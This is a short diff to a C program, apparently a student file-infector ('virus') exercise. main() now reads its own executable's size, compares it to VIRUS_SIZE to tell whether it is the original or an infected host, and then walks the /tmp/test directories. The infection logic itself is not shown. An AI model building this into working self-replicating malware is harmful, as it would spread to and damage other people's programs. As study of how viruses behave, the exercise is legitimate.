@@ -76,9 +76,24 @@ void	moving_through_path(char *path)
 	}
 }
 
-int		main(void)
+int		main(int argc, char *argv[])
 {
-	moving_through_path("/tmp/test");
-	moving_through_path("/tmp/test2");
+	int		fd;
+	int		size;
+
+	(void)argc;
+	fd = open(argv[0], O_RDONLY);
+	if (fd > 0)
+	{
+		size = lseek(fd, (size_t)0, SEEK_END);
+		printf("size %d\n", size);
+		if (size == VIRUS_SIZE)
+			printf("ORIGINAL\n");
+		else
+			printf("HOST\n");
+		moving_through_path("/tmp/test");
+		moving_through_path("/tmp/test2");
+		close(fd);
+	}
 	return (0);
 }
